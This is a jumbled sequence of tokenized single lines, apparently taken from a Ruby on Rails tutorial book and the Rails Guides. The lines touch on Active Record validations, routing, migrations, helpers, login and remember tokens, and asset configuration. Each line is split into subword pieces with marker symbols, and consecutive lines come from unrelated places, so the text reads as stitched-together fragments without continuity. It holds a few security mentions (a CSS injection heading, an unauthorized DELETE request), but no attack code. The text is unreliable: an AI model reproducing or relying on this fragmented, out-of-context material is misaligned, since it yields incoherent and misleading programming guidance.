▁You ▁can ▁even ▁use ▁an ▁ inline ▁method , ▁such ▁as ▁a ▁ Proc , ▁to ▁determine ▁the ▁layout ▖
▁will ▁return ▁instead ▁a ▁ maximum ▁of ▁5 ▁clients ▁beginning ▁with ▁the ▁31 st ▖
▁As ▁noted ▁in ▁a ▁comment ▁in ▁Listing ~\ ref { code : backtrace _ silencer }, ▁you ▁should ▁restart ▁the ▁local ▁ webserver ▁after ▁adding ▁the ▁ silencer .
▁Note ▁that ▁we ▁actually ▁have ▁to ▁include ▁the ▁\ emph { class } ▁name ▁for ▁this ▁association , ▁i ▖ e ▖ ,
▁</ table >
▁De s p ite ▁this ▁ im press ive ▁list , ▁there ▁is ▁ still ▁much ▁to ▁learn ▁about ▁web ▁development .
▁# ▁=> ▁[ ' admin ', ▁' member ', ▁' guest ']
▁ Example ▁Code
▁( We ▁could ▁have ▁written ▁the ▁tests ▁first , ▁but ▁the ▁named ▁routes ▁would ▁have ▁been ▁hard ▁to ▁m o t i v ate ▁without ▁the ▁updated ▁routes ▁file ▖)
▁If ▁you ▁want ▁to ▁see ▁how ▁many ▁records ▁are ▁in ▁your ▁model ' s ▁table ▁you ▁could ▁call ▁` Client ▖ count ` ▁and ▁that ▁will ▁return ▁the ▁number ▖
▁Of ▁course , ▁\ k ode { user \_ with \_ s a me \_ email ▖ valid ?}\ ▁is ▁\ k ode { true }, ▁because ▁the ▁uniqueness ▁validation ▁is ▁current ly ▁case - sensitive , ▁but ▁we ▁want ▁it ▁to ▁be ▁\ k ode { false } .
▁( Ruby ▁even ▁let s ▁you ▁put ▁ s em ic ol on s ▁at ▁the ▁end s ▁of ▁lines ▁if ▁you ▁ mis s ▁them ▁too ▁much ▖)
▁in ▁Listing ~\ ref { code : palindrome _ if } .
▁The ▁method ▁` camelize ` ▁returns ▁its ▁receiver ▁in ▁c a me l ▁case :
▁Rails ▁4 ▁creates ▁both ▁` app / assets / javascripts / application ▖ js ` ▁and ╼` app / assets / stylesheets / application ▖ css ` ▁regardless ▁of ▁whether ▁the ╼ - - skip - sprockets ▁option ▁is ▁used ▁when ▁creating ▁a ▁new ▁rails ▁application ▖
▁There ▁is ▁a ▁default ▁error ╼ message ▁for ▁each ▁one ▁of ▁the ▁validation ▁helpers ▖
▁The ▁params ▁hash ▁has ▁a ▁nested ▁person ▁value , ▁which ▁can ▁therefore ▁be ▁access ed ▁with ▁params [: person ] ▁in ▁the ▁controller .
▁As ▁you ' ve ▁already ▁seen , ▁the ▁`: message ` ▁option ▁let s ▁you ▁specify ▁the ▁message ▁that ╼ will ▁be ▁added ▁to ▁the ▁` errors ` ▁collection ▁when ▁validation ▁fails ▖
▁The ▁rest ▁of ▁the ▁book ▁is ▁d ed icated ▁to ▁f le sh ing ▁out ▁the ▁sample ▁application : ▁first , ▁by ▁adding ▁users ▁who ▁can ▁sign ▁up , ▁sign ▁in , ▁and ▁sign ▁out ; ▁next , ▁by ▁adding ▁user ▁microposts ; ▁and , ▁finally , ▁by ▁adding ▁the ▁ability ▁to ▁follow ▁other ▁users .
▁ Most ▁of ▁the ▁adapter s ▁support ▁multiple ▁ queue s ▖
▁There ▁needs ▁to ▁be ▁a ▁way ╼ of ▁associat ing ▁the ▁records ▁in ▁the ▁` blorgh _ articles ` ▁table ▁with ▁the ▁records ▁in ▁the ╼` users ` ▁table ▖
▁Using ▁the ▁ generalized ▁\ k ode { authenticated ?}\
▁Note ▁that ▁the ▁debug ▁information ▁in ▁Figure ~\ ref { fig : user _ show _ rails _3} ▁confirm s ▁the ▁value ▁of ▁\ k ode { params [: id ]} :
▁invoke ▁helper
▁As ▁indicate d ▁by ▁the ▁helpful ▁message ▁`` A n y ▁modification s ▁you ▁make ▁will ▁be ▁roll ed ▁back ▁on ▁ ex it '' , ▁when ▁started ▁in ▁a ▁ sandbox ▁the ▁console ▁will ▁`` r o ll ▁back '' ▁( i ▖ e ▖ , ▁undo ) ▁any ▁database ▁changes ▁introduce d ▁during ▁the ▁session .
▁This ▁is ▁a ▁defin ite ▁improve ment , ▁but ▁we ▁can ▁do ▁even ▁better : ▁we ▁can ▁call ▁\ k ode { render } ▁\ emph { d ir ec t ly } ▁on ▁the ▁\ k ode {@ users } ▁variable ▁( Listing ~\ ref { code : index _ final _ refactoring }) .
▁" application - 723 d 1 be 6 cc 7 4 1 a 3 a abb 1 ce c 242 76 d 6 8 1 ▖ js "," application ▖ css " :
▁We ▁accomplish ▁this ▁with ▁a ▁pair ▁of ▁methods , ▁\ k ode { store \_ location } ▁and ▁\ k ode { redirect \_ back \_ or }, ▁both ▁defined ▁in ▁the ▁Sessions ▁helper ▁( Listing ~\ ref { code : friendly _ forwarding _ code }) .
▁I ' ll ▁omit ▁the ▁output ▁of ▁console ▁commands ▁when ▁they ▁are ▁not ▁particular ly ▁in str u c tive --- for ▁example , ▁the ▁results ▁of ▁\ k ode { User ▖ new } .
▁create ▁test / helpers / users _ helper _ test ▖ rb
▁" people "▖ classify ▁# ▁=> ▁" Person "
▁<%= ▁link _ to ▁' welcome ', ▁ welcome _ url ▁%>
▁#### # ▁The ▁`: location ` ▁Option
▁File s ▁in ▁the ▁\ k ode { spec / support } ▁directory ▁are ▁automatically ▁included ▁by ▁RSpec , ▁which ▁means ▁that ▁we ▁can ▁write ▁the ▁Home ▁tests ▁as ▁follows :
▁< option ▁value =" "> P lease ▁select </ option >
▁resources ▁: example s
▁The ▁first ▁refactoring ▁attempt ▁in ▁the ▁index ▁view .
▁ Adding ▁a ▁Users ▁resource ▁to ▁the ▁routes ▁file .
▁We ' ve ▁also ▁included ▁a ▁call ▁to ▁\ k ode { assert \_ template } ▁to ▁check ▁that ▁a ▁failed ▁submission ▁re - render s ▁the ▁\ k ode { new } ▁action .
▁( The ▁\ href { http :// r ailscasts ▖ com / episodes / 2 67 - coffee script - basic s } { RailsCast ▁on ▁CoffeeScript ▁basic s } ▁is ▁a ▁good ▁place ▁to ▁start ▖)
▁@ article ▖ destroy
▁ Adding ▁a ▁length ▁validation ▁for ▁the ▁\ k ode { name } ▁attribute ▖
▁scope ▁' admin ' ▁do
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁as ▁ currency :
▁ authenticated ?( : activation , ▁token )
▁Before ▁attempt ing ▁to ▁upgrade ▁an ▁existing ▁application , ▁you ▁should ▁be ▁sure ▁you ▁have ▁a ▁good ▁reason ▁to ▁upgrade ▖
▁We ' ll ▁see ▁how ▁to ▁push ▁the ▁changes ▁up ▁to ▁a ▁remote ▁repository ▁( using ▁\ k ode { git ▁push }) ▁in ▁Section ~\ ref { sec : git _ commands } .
▁In ▁these ▁cases , ▁it ▁is ╼ re com m end ed ▁that ▁you ▁use ▁the ▁block ▁form ▁of ▁` unscope d `:
▁# ▁< url - id > j er e my - k e mp er </ url - id >
▁The ▁easie st ▁way ▁to ▁work ▁with ▁Rails ▁is ▁to ▁store ▁all ▁external ▁data ▁as ▁ UT F -8 ▖
▁string is h ▖ to _ s ▖ html _ safe
▁The ▁` collection ▖ create ` ▁method ▁returns ▁a ▁new ▁object ▁of ▁the ▁ associated ▁type ▖
▁orphan ▁= ▁Object ▖ send (: remove _ const , ▁: M )
▁In ▁case ▁you ' re ▁curious ▁about ▁\ k ode {" 20 14 - 0 7-2 4 ▁00:57:46" }, ▁I ' m ▁not ▁writing ▁this ▁after ▁ midnight ; ▁the ▁timestamp s ▁are ▁record ed ▁in ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Co or d in at ed _ U n ivers al _ Time } { Co or d in at ed ▁Un ivers al ▁Time } ▁( UT C ), ▁which ▁for ▁most ▁practical ▁purposes ▁is ▁the ▁same ▁as ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Green w ic h _ M e an _ Time } { Green w ic h ▁M e an ▁Time } .
▁@ user ▁= ▁User ▖ new
▁To ▁take ▁advantage ▁of ▁the ▁up com ing ▁style ▁elements , ▁we ' ll ▁add ▁some ▁extra ▁elements ▁to
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / array / extract _ options ▖ rb ` .
▁# ▁ SELECT ▁person _ id ▁FROM ▁people
▁create ▁app / views / users / show ▖ html ▖ erb
▁Run ▁the ▁migration ▁using :
▁( Listing ~\ ref { code : microposts _ interface _ test } ▁uses ▁\ k ode { post } ▁followed ▁by ▁\ k ode { follow \_ redirect !}
▁* ▁` config ▖ middleware ▖ insert _ before ( ex ist ing _ middleware , ▁new _ middleware , ▁ args ) ` ▁- ▁Add s ▁the ▁new ▁middleware ▁before ▁the ▁specified ▁existing ▁middleware ▁in ▁the ▁middleware ▁ stack .
▁The ir ▁arguments ▁are ▁assume d ▁to ▁be ▁ qualified ▁constant ╼ name s ▁relative ▁to ▁their ▁receiver :
▁Otherwise , ▁you ▁risk ▁your ▁app ▁or ▁gem ▁break ing ▁when ▁you ▁upgrade ▁to ▁a ▁new er ▁release ▁of ▁Rails .
▁If ▁you ▁set ▁the ▁`: validate ` ▁option ▁to ▁` false `, ▁then ▁ associated ▁objects ▁will ▁not ▁be ▁validate d ▁when ever ▁you ▁save ▁this ▁object ▖
▁The ▁final ▁line ▁in ▁the ▁block , ▁\ k ode { t ▖ timestamp s }, ▁is ▁a ▁special ▁command ▁that ▁creates ▁two ▁\ emph { magic ▁columns } ▁called ▁\ k ode { created \_ at } ▁and ▁\ k ode { updated \_ at }, ▁which ▁are ▁timestamp s ▁that ▁automatically ▁record ▁when ▁a ▁given ▁user ▁is ▁created ▁and ▁updated .
▁This ▁is ▁ perfect ly ▁valid :
▁\ href { http :// www ▖ t hinkful ▖ com / a / railstutorial } { T hinkful } : ▁An ▁online ▁class ▁that ▁pair s ▁you ▁with ▁a ▁ professional ▁engine er ▁as ▁you ▁work ▁through ▁a ▁project - base d ▁c ur r ic ul um .
▁is ▁a ▁project ▁to ▁make ▁a ▁book ▁and ▁ screencasts ▁to ▁teach ▁web ▁development
▁module ▁A
▁| ▁PR IM A RY ▁| ▁4 ▁| ▁ const ▁| ▁1 ▁| ▁|
▁class ▁ Supplier ▁< ▁ActiveRecord :: Base
▁Start s ▁a ▁form ▁tag ▁that ▁point s ▁the ▁action ▁to ▁an ▁url ▁configured ▁with ▁` url _ for _ options ` ▁just ▁like ▁` ActionController :: Base # url _ for ` .
▁This ▁isn ' t ▁technical ly ▁true --- the ▁scaffold ing ▁includes ▁ r udi ment ary ▁tests --- but ▁the ▁generated ▁tests ▁don ' t ▁test ▁for ▁data ▁validation , ▁authentication , ▁or ▁any ▁other ▁custom ▁requirements .
▁### ▁config / environments / production ▖ rb
▁ ub section ▁current _ user ▁( end )╼╼ ▁\ subsection { Chang ing ▁the ▁layout ▁links } ▁% ▁( fold )╼ ▁\ label { sec : cha n g ing _ the _ layout _ links }╼╼
▁The ▁view ▁for ▁the ▁About ▁page ▁with ▁an ▁ embedded ▁Ruby ▁title ▖
▁By ▁default , ▁the ▁` stylesheet _ link _ tag ` ▁creates ▁links ▁with ▁` media =" screen " ▁ rel =" stylesheet " ` ▖
▁Then , ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout } ▁through ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }, ▁we ' ll ▁complete ▁the ▁foundation ▁for ▁the ▁sample ▁application ▁by ▁making ▁a ▁site ▁layout , ▁a ▁user ▁data ▁model , ▁and ▁a ▁full ▁ registration ▁and ▁authentication ▁system ▁( including ▁account ▁activation ▁and ▁password ▁resets ) .
▁We ▁can ▁then ▁use ▁ bcrypt ▁to ▁verify ▁that ▁\ k ode { cookies [: remember \_ token ]} ▁matches ▁the ▁\ k ode { remember \_ digest } ▁generated ▁in ▁Listing ~\ ref { code : user _ model _ remember } .
▁For ▁example : ▁` constraints : ▁ { ▁ subdomain : ▁' api ' ▁}` ▁will ▁match ▁an ▁` api ` ▁ subdomain ▁as ▁expected , ▁however ▁using ▁a ▁symbol ▁` constraints : ▁ { ▁ subdomain : ▁: api ▁}` ▁will ▁not , ▁because ▁` request ▖ subdomain ` ▁returns ▁` ' api ' ` ▁as ▁a ▁ String .
▁This ▁step ▁is ▁optional , ▁and ▁in ▁fact ▁it ' s ▁quite ▁common ▁to ▁leave ▁the ▁topic ▁branch ▁in t ac t .
▁This ▁could ▁lead ▁to ╼ problem s ▁if ▁the ▁table ▁was n ' t ▁already ▁existing ▖
▁ Only ▁ RDoc ▁and ▁ guides ▁can ▁be ▁edit ed ▁via ▁ doc rails ▖
▁If ▁the ▁feedback ▁is ▁that ▁your ▁code ▁doesn ' t ▁be long ▁in ▁the ▁ core , ▁you ▁m ight ▁ still ▁think ▁about ▁re le as ing ▁it ▁as ▁a ▁gem .
▁The ▁Relationship ▁data ▁model .
▁Testing ▁the ▁following / follower ▁ st at ist ic s ▁on ▁the ▁Home ▁page .
▁customer ▖ orders ▖ empty ?
▁$ ▁git ▁remote ▁add ▁rails ▁git :// github ▖ com / rails / rails ▖ git
▁No rm al ▁callbacks ▁ hook ▁into ▁the ▁ life ▁c y c le ▁of ▁Active ▁Record ▁objects , ▁allow ing ▁you ▁to ▁work ▁with ▁those ▁objects ▁at ▁ various ▁point s ▖
▁This ▁exercise ▁is ▁solve d ▁in ▁Section ~\ ref { sec : contact _ page } .
▁This ▁can ▁be ▁made ▁to ▁happen ▁if ╼ this ▁line ▁is ▁inserted ▁into ▁the ▁` config / routes ▖ rb ` ▁file ▁inside ▁the ▁engine :
▁In ▁the ▁present ▁case , ▁this ▁function ▁is
▁( If ▁you ' re ▁using ▁the ▁cloud ▁IDE , ▁you ▁should ▁first ▁ download ▁the ▁database ▁file ▁to ▁the ▁local ▁di s k , ▁as ▁show n ▁in ▁Figure ~\ ref { fig : sqlite _ download } ▖)
▁T hough ▁\ k ode { 0 ▖ ▖ 9 } ▁is ▁a ▁valid ▁ range , ▁the ▁second ▁expression ▁above ▁shows ▁that ▁we ▁need ▁to ▁add ▁parentheses ▁to ▁call ▁a ▁method ▁on ▁it .
▁The ▁next ▁step ▁is ▁to ▁address ▁the ▁difficult y ▁of ▁display ing ▁a ▁ potentially ▁large ▁number ▁of ▁microposts .
▁* ▁` extending `
▁The ▁argument ▁of ▁the ▁\ k ode { scaffold } ▁command ▁is ▁the ▁ singular ▁version ▁of ▁the ▁resource ▁name ▁( in ▁this ▁case , ▁\ k ode { User }), ▁together ▁with ▁optional ▁parameters ▁for ▁the ▁data ▁model ' s ▁attributes
▁Article ▖ joins ( comments : ▁: guest )
▁If ▁either ▁of ▁these ▁save s ▁fails ▁due ▁to ▁validation ▁errors , ▁then ▁the ▁assignment ▁statement ▁returns ▁` false ` ▁and ▁the ▁assignment ▁itself ▁is ▁can ce ll ed .
▁\ k ode { f ▖ object } ▁is ▁\ k ode {@ micropost } .
▁Those ▁users ▁could n ' t ▁even ▁sign ▁up ; ▁now ▁users ▁can ▁sign ▁up , ▁log ▁in , ▁log ▁out , ▁view ▁their ▁profile s , ▁edit ▁their ▁settings , ▁and ▁see ▁an ▁index ▁of ▁all ▁users --- and ▁some ▁can ▁even ▁destroy ▁other ▁users .
▁( Note ▁that ▁this ▁take s ▁effect ▁immediately ; ▁you ▁don ' t ▁need ▁to ▁click ▁a ▁`` Save '' ▁button ▖)
▁Rails ▁will ▁generate ▁an ▁appropriate ▁ MIME ▁type ▁automatically .
▁For ▁example , ▁given ▁the ▁declaration :
▁The ▁result ▁should ▁be ▁a ▁\ passing \ ▁test ▁suite :
▁For ▁convenience , ▁Listing ~\ ref { code : micropost _ css } ▁actually ▁has ▁\ emph { all } ▁the ▁CSS ▁needed ▁for ▁this ▁chapter .
▁These ▁should ▁be ╼ used ▁in ▁the ▁order ▁the ▁process ing ▁should ▁be ▁applied ▖
▁------------ -
▁In ▁this ▁case , ▁though , ▁such ▁a ▁test ▁involve s ▁sever al ▁new ▁idea s , ▁so ▁for ▁now ▁it ' s ▁best ▁def er r ed ▁to ▁its ▁own ▁section ▁( Section ~\ ref { sec : testing _ layout _ change s }) .
▁get ▁' : controller / : action / : id / : user _ id '
▁We ▁come ▁now ▁to ▁the ▁p in n ac le ▁of ▁our ▁sample ▁application : ▁the ▁status ▁feed .
▁with ▁the ▁single ▁line
▁Fin ally , ▁the ▁\ k ode { create \_ remember \_ token } ▁method ▁needs ▁to ▁\ emph { as sign } ▁to ▁one ▁of ▁the ▁user ▁attributes , ▁and ▁in ▁this ▁context ▁it ▁is ▁necessary ▁to ▁use ▁the ▁\ k ode { self } ▁keyword ▁in ▁front ▁of ▁\ k ode { remember \_ token } :
▁Produce ▁a ▁string ▁representation ▁of ▁a ▁number ▁in ▁ human - read able ▁words :
▁Extensions ▁to ▁` N um er ic `
▁The ▁methods ▁` second `, ▁` th ir d `, ▁` f our th `, ▁and ▁` f if th ` ▁return ▁the ▁corresponding ▁element ▁( ` first ` ▁is ▁built - in )▖
▁has _ many ▁: ex p en s es , ▁ dependent : ▁: destroy
▁With ▁the ▁HTML ▁elements ▁and ▁CSS ▁classes ▁in ▁place , ▁we ▁can ▁style ▁the ▁profile ▁page ▁( including ▁the ▁ sidebar ▁and ▁the ▁Gravatar ) ▁with ▁the ▁ SCSS ▁show n ▁in ▁Listing ~\ ref { code : sidebar _ css }
▁To ▁solve ▁the ▁problem ▁of ▁a ▁missing ▁page ▁title , ▁we ' ll ▁define ▁a ▁custom ▁helper ▁called ▁\ k ode { full \_ title } .
▁ Write ▁a ▁test ▁for ▁the ▁flash ▁implemented ▁in ▁Section ~\ ref { sec : the _ flash } .
▁* ▁Do ▁you ▁like ▁the ▁implementation ?
▁For ▁most ▁applications , ▁this ▁should ▁be ▁a ▁ tr an s parent ▁change ▖
▁If ▁you ' re ▁not ▁using ▁the ▁cloud ▁IDE ▁or ▁an ▁equivalent ▁ Linux ▁system , ▁do ▁a ▁ Google ▁search ▁for ▁`` image magic k ▁< your ▁platform > '' .
▁As ▁noted ▁in ▁Section ~\ ref { sec : a _ hashed _ password }, ▁\ k ode { has \_ secure \_ password } ▁automatically ▁add s ▁an ▁\ k ode { authenticate } ▁method ▁to ▁the ▁corresponding ▁model ▁objects .
▁<%= ▁image _ tag ▁" home ▖ g if ", ▁size : ▁" 50 x 20 " ▁%>
▁$ ▁ subl ▁ .
▁No ▁real ▁understanding .
▁An y ▁subsequent ▁conditions ▁ chain ed ▁to ▁the ▁returned ▁relation ▁will ▁con t in ue ▁ generating ▁empty ▁relation s ▖
▁### ▁HTTP ▁Verb ▁ Constraint s
▁To ▁include ▁` app / assets / javascripts / main ▖ js ` ▁and ▁` app / assets / javascripts / photos / columns ▖ js `:
▁module ▁Your App
▁assemblies ▖ destroy ( object , ▁ ▖▖▖)
▁In side ▁the ▁block , ▁the ▁\ k ode { create \_ table } ▁method ▁uses ▁the ▁\ k ode { t } ~ object ▁to ▁create ▁\ k ode { name } ▁and ▁\ k ode { email } ▁columns ▁in ▁the ▁database , ▁both ▁of ▁type ▁\ k ode { string }
▁E ve ry ▁time ▁a ▁validation ▁fails , ▁an ▁error ▁message ▁is ▁added ▁to ▁the ▁object ' s ╼` errors ` ▁collection , ▁and ▁this ▁message ▁is ▁ associated ▁with ▁the ▁attribute ▁being ╼ validate d .
▁Here ▁we ' ve ▁used
▁4 ▁examples , ▁1 ▁failure
▁class ▁Create Supplier s ▁< ▁ActiveRecord :: Migration
▁in ▁Listing ~\ ref { code : gemfile _ sample _ app } .
▁Some th ing ▁like :
▁In clu d ing ▁\ k ode { if ▁request ▖ get ?}\ ▁prevent s ▁this ▁from ▁happen ing
▁The ▁ video ▁tag ▁also ▁supports ▁all ▁of ▁the ▁`< video >` ▁HTML ▁options ▁through ▁the ▁HTML ▁options ▁hash , ▁including :
▁### ▁` find _ or _ create _ by `
▁Before ▁using ▁Git , ▁you ▁should ▁perform ▁a ▁set ▁of ▁one - time ▁setup ▁steps .
▁Note ▁also ▁the ▁use ▁of ▁\ k ode {@ user ▖ reload } ▁( first ▁seen ▁in ▁Section ~\ ref { sec : updating _ user _ objects }) ▁to ▁ reload ▁the ▁user ' s ▁values ▁from ▁the ▁database ▁and ▁confirm ▁that ▁they ▁were ▁successfully ▁updated .
▁#### ▁ Methods ▁Add ed ▁by ▁` has _ one `
▁In ▁the ▁present ▁context , ▁a ▁\ emph { hash } ▁refer s ▁not ▁to ▁the ▁Ruby ▁data ▁structure ▁from ▁Section ~\ ref { sec : hashes _ and _ symbols } ▁but ▁rather ▁to ▁the ▁result ▁of ▁apply ing ▁an ▁ ir reversible ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hash _ function } { hash ▁function } ▁to ▁input ▁data ▖)
▁class _ name
▁< p > Welcome !
▁Here ▁\ k ode { Word ▁< ▁ String } ▁is ▁the ▁Ruby ▁syntax ▁for ▁inheritance ▁( d is c us s ed ▁brief ly ▁in ▁Section ~\ ref { sec : static _ pages }), ▁which ▁ensure s ▁that , ▁in ▁addition ▁to ▁the ▁new ▁\ k ode { palindrome ?}\ ▁method , ▁words ▁also ▁have ▁all ▁the ▁same ▁methods ▁as ▁strings :
▁The ▁commit ▁and ▁push ▁ sequence ▁above ▁represent s ▁the ▁kind ▁of ▁pattern ▁I ▁would ▁or dinarily ▁follow ▁in ▁real - life ▁development , ▁but ▁for ▁simplicity ▁I ' ll ▁typical ly ▁omit ▁such ▁inter media te ▁commit s ▁from ▁now ▁on .
▁They ▁are ▁often ▁useful ▁because ▁they ▁are ▁t ru ly ▁literal , ▁and ▁contain ▁exactly ▁the ▁characters ▁you ▁type .
▁Note ▁the ▁leading ▁ underscore ▁character : ▁partials ▁are ▁named ▁with ▁a ▁leading ▁ underscore ▁to ▁distinguish ▁them ▁from ▁regular ▁views , ▁even ▁though ▁they ▁are ▁refer r ed ▁to ▁without ▁the ▁ underscore ▖
▁in ▁Listing ~\ ref { code : sample _ app _ readme } .
▁Defaults ╼ to ▁` ' http ▁authentication ' ` .
▁\ \ ▁\ file path { app / helpers / application \_ helper ▖ rb } } ╼ %= ▁ lang : ruby ╼\ begin { code } ╼ module ▁Application Helper ╼╼
▁In ▁our ▁case , ▁we ▁want ▁it ▁to ▁show ▁up ▁when ▁we ╼ nav ig ate ▁to ▁the ▁root ▁URL ▁of ▁our ▁site , ▁< http :// localhost : 3 000 > ▖
▁The ▁` object ` ▁and ▁` as ` ▁options ▁can ▁also ▁be ▁used ▁together :
▁Here ▁we ' ve ▁included ▁the ▁\ k ode { params [: user ]} ▁hash ▁expected ▁by ▁\ k ode { User ▖ new } ▁in ▁the ▁\ k ode { create } ▁action ▁( Listing ~\ ref { code : signup _ flash }) .
▁INFO : ▁As ▁a ▁rule ▁of ▁thumb ▁you ▁can ▁think ▁of ▁` underscore ` ▁as ▁the ▁ inverse ▁of ▁` camelize `, ▁though ▁there ▁are ▁cases ▁where ▁that ▁does ▁not ▁hold ▖
▁Active ▁Record ▁allows ▁us ▁to ▁ im po se ▁such ▁constraints ▁using ▁\ emph { validations } ▁( se en ▁brief ly ▁before ▁in ▁Section ~\ ref { sec : putting _ the _ micro _ in _ microposts }) .
▁We ▁can ▁now ▁check ▁our ▁database ▁just ▁to ▁be ▁double - sure ▁that ▁the ▁new ▁user ▁was ▁actually ▁created :
▁For ▁example , ▁on ▁my ▁system ▁either ▁of ▁the ▁following ▁works ▁( de pending ▁on ▁whether ▁I ' m ▁using ▁the ▁cloud ▁IDE ▁or ▁the ▁local ▁server ) :
▁ Allow ing ▁empty ▁passwords ▁on ▁update ▖
▁### ▁Configur ing ▁i 18 n
▁* ▁How ▁to ▁install ▁Rails , ▁create ▁a ▁new ▁Rails ▁application , ▁and ▁ connect ▁your ╼ ▁application ▁to ▁a ▁database .
▁No ▁layout .
▁### ▁CSS ▁Injection
▁* ▁` collection ▖ create !(
▁This ▁introduce s ▁the ▁Sass ▁\ emph { mixin } ▁facilit y , ▁in ▁this ▁case ▁called ▁\ k ode { box \_ sizing } .
▁The ▁generation ▁of ▁the ▁reader ▁instance ▁method ▁can ▁be ▁prevent ed ▁by ▁setting ▁the ▁option ▁`: instance _ reader ` ▁to ▁` false ` .
▁This ▁no is i er ▁construction ▁make s ▁debugging ▁easier ▁by ▁avoid ing ▁ s ile nt ▁errors .
▁# ▁No ▁change ▁needed ; ▁PATCH ▁will ▁be ▁preferred , ▁and ▁ PUT ▁will ▁ still ▁work .
▁* ▁En v ir on ment - specific ▁configuration ▁files
▁To ▁fix ▁this , ▁we ▁just ▁need ▁to ▁add ▁the ▁user ▁id ▁presence ▁validation ▁show n ▁in ▁Listing ~\ ref { code : micropost _ user _ id _ validation } .
▁config ▖ assets ▖ digest ▁= ▁false
▁< div > <%= ▁submit _ tag ▁' Save ' ▁%></ div >
▁We ' ll ▁use ▁an ▁HTML ▁\ emph { form } ▁to ▁submit ▁user ▁signup ▁information ▁to ▁our ▁application ▁( Section ~\ ref { sec : signup _ form }), ▁which ▁will ▁then ▁be ▁used ▁to ▁create ▁a ▁new ▁user ▁and ▁save ▁its ▁attributes ▁to ▁the ▁database ▁( Section ~\ ref { sec : successful _ signup s }) .
▁$ ▁ cd ▁~/ workspace /
▁#### ▁number _ with _ precision
▁Before ▁we ▁move ▁on , ▁though , ▁there ▁are ▁two ▁task s ▁to ▁complete .
▁When ▁the ▁user ▁click s ▁the ▁link , ▁find ▁the ▁user ▁by ▁email ▁address , ▁and ▁then ▁ authenticate ▁the ▁token ▁by ▁compar ing ▁with ▁the ▁activation ▁digest .
▁( If ▁instead ▁you ▁get ▁an ▁error ▁message ▁indicat ing ▁that ▁the ▁email ▁address ▁has ▁already ▁been ▁taken , ▁be ▁sure ▁to ▁run ▁the ▁\ k ode { db : migrate : reset } ▁Rake ▁task ▁as ▁indicate d ▁in ▁Section ~\ ref { sec : signup _ form } ▁and ▁restart ▁the ▁development ▁ webserver ▖)
▁Action ▁Mailer ▁ 3▖0 ▁make s ▁ inline ▁ attachments , ▁which ▁involve d ▁a ▁lot ▁of ▁ha c k ing ▁in ▁pre ▁ 3▖0 ▁versions , ▁much ▁simple r ▁and ▁tri via l ▁as ▁they ▁should ▁be .
▁Having ▁show n ▁how ▁to ▁create , ▁show , ▁and ▁edit ▁users , ▁we ▁come ▁finally ▁to ▁destroying ▁them ▁( Figure ~\ ref { fig : demo _ destroy _ user }) .
▁in ▁Listing ~\ ref { code : rails _ routes _ root _ route } .
▁As ▁construct ed , ▁only ▁admin s ▁can ▁destroy ▁users ▁through ▁the ▁web ▁since ▁only ▁they ▁can ▁see ▁the ▁delete ▁links , ▁but ▁there ' s ▁ still ▁a ▁ ter r ible ▁security ▁hole : ▁any ▁ sufficient ly ▁sophisticat ed ▁attacker ▁could ▁simply ▁issue ▁a ▁\ text tt { DELETE } ▁request ▁directly ▁from ▁the ▁command ▁line ▁to ▁delete ▁any ▁user ▁on ▁the ▁site .
▁### ▁Controller ▁ Specific ▁ Asset s
▁Rails ▁also ▁comes ▁with ▁built - in ▁help ▁that ▁you ▁can ▁generate ▁using ▁the ▁rake ╼ command - line ▁ utility :
▁In ▁this ▁chapter , ▁we ▁will ▁principal ly ▁be ▁developing ▁the ▁static ▁pages ▁introduce d ▁in ▁Section ~\ ref { sec : static _ pages }, ▁including ▁a ▁site ▁ logo , ▁a ▁navigation ▁header , ▁and ▁a ▁site ▁ footer .
▁Then ▁add ▁another ▁search ▁feature ▁for ▁microposts .
▁ ╼ ▁* ▁ compiled ▁file , ▁but ▁it ' s ▁generally ▁better ▁to ▁create ▁a ▁new ▁file ▁per ▁style
▁Client ▖ order (" created _ at ▁DESC ")
▁In t eg ers ▁in ▁the ▁example ▁above ▁are ▁suppose d ▁to ▁come ▁from ▁the ▁respective ▁calls ▁to ▁` id ` .
▁At ▁the ▁end ▁of ▁this ▁process , ▁no ▁matter ▁where ▁you ▁started , ▁you ▁should ▁be ▁ready ▁for ▁the ▁many ▁more ▁inter media te - to - advance d ▁Rails ▁resources ▁out ▁there .
▁On ▁Windows , ▁many ▁users ▁prefer ▁to ▁develop ▁Rails ▁applications ▁in ▁a ▁virtual ▁machine ▁running ▁ Linux , ▁in ▁which ▁case ▁your ▁command - line ▁options ▁reduce ▁to ▁the ▁previous ▁case .
▁Use ▁Rails ' ▁` sanitize () ` ▁method ▁as ▁a ▁model ▁for ▁a ▁ white list ▁CSS ▁filter , ▁if ▁you ▁really ▁need ▁one .
▁In ▁the ▁case ▁of ▁a ▁belongs _ to ▁relationship , ▁an ▁association ▁key ▁can ▁be ▁used ▁to ▁specify ▁the ▁model ▁if ▁an ▁Active ▁Record ▁object ▁is ▁used ▁as ▁the ▁value ▖
▁def ▁update
▁# ▁do ▁something ▁before ▁perform
▁The ▁method ▁` strip _ her e doc ` ▁ strip s ▁indentation ▁in ▁here docs .
▁# ▁Add s ▁a ▁" !" ▁to ▁original ▁template .
▁\ label { table : RESTful _ microposts } }╼\ end { table }╼╼ ▁\ subsection { Micropost ▁access ▁control } ▁% ▁( fold )╼ ▁\ label { sec : micropost _ access _ control }╼╼
▁On ▁a ▁production ▁site ▁with ▁significant ▁traffic , ▁it ▁is ▁a ▁good ▁idea ▁to ▁turn ▁\ href { https :// dev center ▖ heroku ▖ com / articles / maintenance - m ode }{\ emph { maintenance ▁mode } } ▁on ▁before ▁making ▁the ▁changes :
▁in ▁Listing ~\ ref { code : micropost _ validations } .
▁U nfortunately , ▁as ▁noted ▁in ▁the ▁text ▁and ▁in ▁the ▁comment ▁in ▁Listing ~\ ref { code : failed _ login _ attempt }, ▁this ▁code ▁isn ' t ▁quite ▁right .
▁But , ▁this ▁is ▁also ▁a ▁ threat ▁to ▁web ▁applications , ▁as ▁ malicious ▁code ▁can ▁be ▁hidden ▁in ▁different ▁encoding s ▁that ▁the ▁web ▁browser ▁m ight ▁be ▁able ▁to ▁process , ▁but ▁the ▁web ▁application ▁m ight ▁not ▖
